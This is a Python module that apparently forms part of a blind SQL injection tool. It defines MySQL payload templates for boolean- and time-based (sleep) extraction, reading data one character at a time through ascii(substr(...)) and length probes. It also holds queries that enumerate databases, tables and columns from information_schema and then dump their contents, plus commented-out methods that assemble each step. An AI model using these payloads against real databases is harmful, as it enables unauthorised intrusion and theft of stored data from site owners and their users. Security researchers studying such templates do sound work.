import config
class payload:
    timeinj = r"if(ascii(substr(({pl}),{n},1)){tj},sleep({}),1){end}"

    pascii = r'ascii(substr(({pl}),{n},1)){tj}{end}'
    plength = r'length(({pl})){tj}{end}'
    tpascii = r"if(ascii(substr(({pl}),{n},1)){tj},sleep(%d),1){end}"%config.time
    tplength = r"if(length(({pl})){tj},sleep(%d),1){end}"%config.time
    curdb = 'database()'
    dbs='select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA'
    tbs="select group_concat(table_name) from information_schema.tables where table_schema='{db}'"
    cbs="select group_concat(column_name) from information_schema.columns where table_name='{tb}' and table_schema='{db}'"
    ds ="select group_concat({cb}) from {db}.{tb}"
    # def CurDb(self,n):
    #     if config.type == 'boolen':
    #         payload = self.pascii.format(pl='database()',n = n)
    #     else:
    #         payload = self.pascii.format(pl='database()',n = n)
    #     return payload
    # def CurDbn(self):
    #     payload = self.plength.format(pl='database()')
    #     return payload
    # def Dbs(self,n):
    #     payload = self.pascii.format(pl=r"select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA", n=n)
    #     return payload
    # def Dbn(self):
    #     payload = self.plength.format(pl=r'select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA')
    #     return payload
    # def Tbn(self,db):
    #     payload = self.plength.format(pl=r"select group_concat(table_name) from information_schema.tables where table_schema='%s'"%db)
    #     return payload
    # def Tbs(self,db,n):
    #     payload = self.pascii.format(pl=r"select group_concat(table_name) from information_schema.tables where table_schema='%s'"%db,n=n)
    #     return payload
    # def Cbn(self,db,tb):
    #     payload = self.plength.format(pl=r"select group_concat(column_name) from information_schema.columns where table_name='%s' and table_schema='%s'"%(tb,db))
    #     return payload
    # def Cbs(self,db,tb,n):
    #     payload = self.pascii.format(pl=r"select group_concat(column_name) from information_schema.columns where table_name='%s' and table_schema='%s'"%(tb,db),n=n)
    #     return payload
    # def Dn(self,db,tb,cb):
    #     payload = self.plength.format(pl=r"select group_concat(%s) from %s.%s"%(cb,db,tb))
    #     return payload
    # def Ds(self,db,tb,cb,n):
    #     payload = self.pascii.format(pl=r"select group_concat(%s) from %s.%s"%(cb,db,tb),n=n)
    #     return payload
pd = payload()